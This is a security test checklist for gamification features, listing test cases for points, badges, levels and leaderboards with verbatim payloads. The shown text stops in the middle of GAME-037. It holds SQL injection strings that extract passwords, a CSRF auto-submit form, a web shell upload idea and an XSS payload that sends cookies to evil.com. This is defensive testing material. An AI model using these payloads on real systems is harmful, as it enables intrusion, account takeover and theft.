# 17. Gamification & Engagement — Checklist

Feature-area security **test cases** for “17. Gamification & Engagement”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*174 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## GAME-001 — IDOR on Points Balance Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Login as User A and check own points balance. 2. Intercept the request and change user_id to User B. 3. Submit and check if User B's points balance is disclosed. 4. Try multiple user IDs.

**Expected Result:** Application must verify that the authenticated user can only view their own points balance and reject requests for other users' data.

**Payload Example:**

```
Change GET /api/points/balance?user_id=1001 to user_id=1002;change GET /api/users/1002/points with User A token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-002 — Points Balance Manipulation via Parameter Tampering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Earn points through a valid action. 2. Intercept the points credit request. 3. Modify the points_amount parameter to a much higher value. 4. Submit and check if inflated points are credited.

**Expected Result:** Application must calculate points server-side based on the actual action performed and never accept client-provided point values.

**Payload Example:**

```
Change points_amount=10 to points_amount=999999 in POST /api/points/credit body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-003 — Negative Points Injection
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Trigger a points earning action. 2. Intercept the request and set points to a negative value. 3. Submit and check if negative points credit causes an increase in balance or debit to another account. 4. Try with debit endpoint using negative values for credit.

**Expected Result:** Application must validate that point values are positive integers within expected bounds and reject negative values.

**Payload Example:**

```
Change points=10 to points=-10000 in credit endpoint;change debit_amount=10 to debit_amount=-500
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-004 — Race Condition on Points Earning
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Identify a one-time points earning action like first purchase bonus. 2. Send multiple simultaneous requests to claim the points. 3. Check if the points are credited multiple times. 4. Verify total points balance.

**Expected Result:** Application must implement proper locking and idempotency to prevent duplicate points crediting from simultaneous requests.

**Payload Example:**

```
Send 50 concurrent POST /api/points/claim-bonus requests using Turbo Intruder
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite;Custom Scripts

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-005 — Points Transfer IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. If points transfer exists transfer points to another user. 2. Intercept the request and change from_user_id to another user. 3. Check if points are debited from a different user's account.

**Expected Result:** Application must verify that the from_user matches the authenticated session and reject transfers from non-owned accounts.

**Payload Example:**

```
Change from_user_id=1001 to from_user_id=1002 in POST /api/points/transfer while authenticated as User A
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-006 — SQL Injection in Points Query
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Access points history or balance endpoints. 2. Inject SQL payloads in parameters like user_id or date_range or transaction_type. 3. Observe response for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all points-related database operations.

**Payload Example:**

```
GET /api/points/history?user_id=' OR 1=1--;GET /api/points?transaction_type=earn' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-007 — Points Overflow via Integer Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Attempt to earn or transfer points with extremely large values near integer boundaries. 2. Use values like 2147483647 or 9999999999999. 3. Check for integer overflow causing negative balance or unlimited points.

**Expected Result:** Application must validate point values against maximum bounds and handle large integers safely without overflow.

**Payload Example:**

```
points_amount=2147483647;points=9999999999999999;transfer_amount=2147483648
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-008 — Unauthorized Points Deduction
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. As a regular user attempt to access admin points deduction endpoints. 2. Try to debit points from other users. 3. Check if role-based access control is enforced on deduction operations.

**Expected Result:** Application must restrict points deduction operations to authorized admin roles and verify ownership for self-deduction.

**Payload Example:**

```
POST /api/admin/points/deduct with regular user token;POST /api/points/debit targeting another user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-009 — Points Expiry Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Identify expired points in the account. 2. Attempt to use or redeem expired points via API. 3. Modify the expiry_date parameter if present. 4. Check if expired points can be utilized.

**Expected Result:** Application must validate points expiry server-side at the time of redemption and reject transactions using expired points.

**Payload Example:**

```
Use expired points in POST /api/points/redeem;modify expiry_date=2030-12-31 in points transaction request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-010 — Points History Tampering
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Access points transaction history. 2. Attempt to modify or delete historical transaction records via API. 3. Check if history is immutable. 4. Try to inject false transactions.

**Expected Result:** Application must maintain an immutable points transaction ledger that cannot be modified or deleted by any user.

**Payload Example:**

```
PUT /api/points/history/TXN-1001 to modify amount;DELETE /api/points/history/TXN-1001;POST /api/points/history to inject
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-011 — CSRF on Points Transfer
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Craft a malicious page that auto-submits a points transfer from victim to attacker. 2. Lure the authenticated victim to visit. 3. Check if points are transferred without victim's explicit consent.

**Expected Result:** Application must validate anti-CSRF tokens on all points transfer and redemption operations.

**Payload Example:**

```
<form action='https://target.com/api/points/transfer' method='POST'><input name='to_user' value='attacker'><input name='amount' value='10000'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-012 — Double Spending of Points
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Check points balance. 2. Simultaneously send two redemption requests each using the full balance. 3. Check if both redemptions succeed creating a double-spend scenario.

**Expected Result:** Application must implement atomic transactions and proper locking to prevent double-spending of points.

**Payload Example:**

```
Send concurrent POST /api/points/redeem with full_balance=true from two sessions simultaneously
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-013 — Points Earning Through Cancelled Actions
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Perform an action that earns points like making a purchase. 2. Immediately cancel the action or request refund. 3. Check if points remain credited despite the cancellation.

**Expected Result:** Application must reverse points when the earning action is cancelled or refunded and maintain consistency between transactions and points.

**Payload Example:**

```
Earn points via purchase then POST /api/orders/cancel and verify points are deducted back
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-014 — Unauthenticated Points API Access
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Capture points-related API requests. 2. Remove authentication headers. 3. Replay requests without authentication. 4. Check if points operations succeed without valid credentials.

**Expected Result:** Application must require valid authentication for all points-related endpoints.

**Payload Example:**

```
Remove Authorization header from GET /api/points/balance and POST /api/points/earn
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-015 — XSS in Points Transaction Description
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Earn points from an action where the description includes user-controlled content. 2. Inject XSS payload in the transaction description source. 3. View points history. 4. Check if the payload executes.

**Expected Result:** Application must sanitize all transaction descriptions and encode output when rendering points history.

**Payload Example:**

```
Create item with name=<script>alert(document.cookie)</script> that becomes points transaction description
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-016 — IDOR on Badge Assignment
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Earn a badge through legitimate activity. 2. Intercept the badge assignment request. 3. Change user_id to another user. 4. Check if the badge is assigned to the other user's account.

**Expected Result:** Application must validate badge assignment only to the authenticated user who completed the qualifying action.

**Payload Example:**

```
Change POST /api/badges/assign with user_id=1001 to user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-017 — Unauthorized Badge Self-Assignment
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. List all available badge IDs via API. 2. Attempt to assign badges directly without completing the required actions. 3. Call the badge assignment endpoint with arbitrary badge_id values.

**Expected Result:** Application must verify that the user has completed all required conditions before assigning a badge and not accept direct assignment requests.

**Payload Example:**

```
POST /api/badges/assign with badge_id=premium_badge or badge_id=admin_exclusive without qualifying actions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-018 — Badge Criteria Bypass via Parameter Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Identify badge earning criteria. 2. Intercept the criteria check request. 3. Modify parameters like purchase_count or review_count to meet criteria artificially. 4. Check if badge is awarded.

**Expected Result:** Application must verify badge criteria against actual server-side records and not trust client-provided achievement data.

**Payload Example:**

```
Change purchase_count=1 to purchase_count=100;modify criteria_met=false to criteria_met=true in badge check
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-019 — Race Condition on One-Time Badge
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Identify a badge that can only be earned once. 2. Send multiple simultaneous requests to claim the badge. 3. Check if the badge is awarded multiple times or duplicated.

**Expected Result:** Application must implement idempotent badge assignment preventing duplicate awards from concurrent requests.

**Payload Example:**

```
Send 50 concurrent POST /api/badges/claim/FIRST_PURCHASE_BADGE requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-020 — Badge Display XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If custom badge names or descriptions are possible inject XSS payloads. 2. View the badge display on profile or leaderboard. 3. Check if payload executes in other users' browsers.

**Expected Result:** Application must sanitize all badge-related content and encode output when rendering badges in any context.

**Payload Example:**

```
badge_name=<script>alert(1)</script>;badge_description=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-021 — Badge Removal IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If badge removal is possible remove own badge. 2. Intercept and change user_id or badge_id to target another user's badge. 3. Check if another user's badge is removed.

**Expected Result:** Application must verify ownership and authorization before allowing any badge removal operations.

**Payload Example:**

```
DELETE /api/badges/users/1002/badges/BADGE-001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-022 — Badge Image Upload Vulnerability
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If custom badge images can be uploaded attempt to upload malicious files. 2. Upload web shells disguised as images. 3. Check file type validation and content scanning.

**Expected Result:** Application must validate badge image uploads by content type not extension and store outside web root without execute permissions.

**Payload Example:**

```
Upload shell.php.jpg;badge.svg containing JavaScript;polyglot image with PHP code
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## GAME-023 — Badge Enumeration and Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Enumerate all badge IDs via API. 2. Check if hidden or admin-only badges are discoverable. 3. Access badge metadata including earning criteria for secret badges.

**Expected Result:** Application must not expose hidden badge details or earning criteria for undiscovered badges to unauthorized users.

**Payload Example:**

```
GET /api/badges/all;GET /api/badges/hidden;GET /api/badges/ADMIN-BADGE-001/criteria
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## GAME-024 — SQL Injection in Badge Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Search or filter badges by name or category. 2. Inject SQL payloads in search parameters. 3. Observe response for SQL errors or unauthorized data.

**Expected Result:** Application must use parameterized queries for all badge search and filter operations.

**Payload Example:**

```
GET /api/badges?search=' OR 1=1--;GET /api/badges?category=gold' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-025 — Level Manipulation via Direct API Call
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Check current level via API. 2. Attempt to directly set level by calling level update endpoint. 3. Modify level_id or tier parameter. 4. Check if level is elevated without earning it.

**Expected Result:** Application must calculate user level server-side based on actual progress data and not accept client-provided level values.

**Payload Example:**

```
PUT /api/users/me/level with level=10 or tier=platinum;POST /api/levels/upgrade with force=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-026 — Tier Downgrade Prevention Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Achieve a high tier. 2. Perform actions that should cause a downgrade. 3. Check if downgrade protection can be bypassed or manipulated. 4. Test grace period manipulation.

**Expected Result:** Application must enforce tier downgrade rules consistently and not allow manipulation of grace periods or protection mechanisms.

**Payload Example:**

```
Modify grace_period_end or protection_status in tier management request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-027 — XP/Points Manipulation for Level Advancement
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Intercept XP earning requests. 2. Modify the XP amount to trigger immediate level-up. 3. Check if the application validates XP amounts server-side. 4. Test with boundary values near level thresholds.

**Expected Result:** Application must calculate XP server-side based on actual actions and validate level transitions against accumulated XP records.

**Payload Example:**

```
Change xp_earned=10 to xp_earned=999999 to trigger level_up;modify POST /api/xp/earn amount field
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-028 — Level Benefits Access Without Proper Level
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. As a low-level user attempt to access features restricted to higher levels. 2. Modify level or tier claims in JWT or request parameters. 3. Check if level-restricted features are accessible.

**Expected Result:** Application must validate user level server-side before granting access to level-restricted features and not trust client claims.

**Payload Example:**

```
Add tier=platinum to request headers;modify JWT claim level=10;access /api/premium-features with basic level
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-029 — IDOR on Level Information Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. View own level and progress. 2. Change user_id to view other users' level details and progress data. 3. Check for information disclosure of other users' tier benefits.

**Expected Result:** Application must control access to detailed level information based on privacy settings and authorization rules.

**Payload Example:**

```
GET /api/users/1002/level-details;GET /api/tiers/progress?user_id=1002 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-030 — Race Condition on Level Threshold
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Accumulate XP just below a level threshold. 2. Send multiple concurrent XP earning requests to cross the threshold. 3. Check if multiple level-up rewards are granted.

**Expected Result:** Application must handle level transitions atomically to prevent duplicate level-up rewards from concurrent requests.

**Payload Example:**

```
Send 20 concurrent POST /api/xp/earn requests each earning enough to cross level threshold
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-031 — SQL Injection in Tier Lookup
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Query tier information via API. 2. Inject SQL payloads in tier_id or level parameters. 3. Observe for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all tier and level database operations.

**Payload Example:**

```
GET /api/tiers?id=' OR 1=1--;GET /api/levels?name=gold' UNION SELECT credit_card FROM payments--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-032 — Level Reset Abuse
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. If level reset functionality exists test if it can be used to re-earn level-up bonuses. 2. Reset level and re-earn rewards. 3. Check for accumulated benefit exploitation.

**Expected Result:** Application must track lifetime earnings and prevent re-earning of one-time level-up bonuses after level resets.

**Payload Example:**

```
POST /api/levels/reset then re-earn first_level_bonus multiple times
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-033 — Leaderboard Score Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Submit a score to the leaderboard. 2. Intercept the request and modify the score value. 3. Check if the inflated score is accepted and displayed on the leaderboard.

**Expected Result:** Application must calculate and validate scores server-side and never accept client-submitted score values.

**Payload Example:**

```
Change POST /api/leaderboard/submit with score=100 to score=9999999
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-034 — IDOR on Leaderboard Data Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Access leaderboard data. 2. Check if individual user details are exposed beyond what should be public. 3. Access private leaderboards by changing leaderboard_id.

**Expected Result:** Application must only expose necessary public information on leaderboards and enforce access control on private leaderboards.

**Payload Example:**

```
GET /api/leaderboards/private-board-001;check leaderboard response for email;phone;address of other users
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-035 — Leaderboard SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Use leaderboard filtering or search functionality. 2. Inject SQL payloads in filter parameters like time_period or category or region. 3. Observe response.

**Expected Result:** Application must use parameterized queries for all leaderboard database operations.

**Payload Example:**

```
GET /api/leaderboard?period=' OR 1=1--;GET /api/leaderboard?category=all' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-036 — XSS via Leaderboard Username
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Change username or display name to an XSS payload. 2. Earn a position on the leaderboard. 3. View the leaderboard page. 4. Check if the payload executes for all viewers.

**Expected Result:** Application must sanitize and encode all user-provided data displayed on leaderboards.

**Payload Example:**

```
Change username to <script>alert(document.cookie)</script> or <img src=x onerror=alert(1)> and reach leaderboard
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-037 — Leaderboard Sybil Attack
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Leaderboards

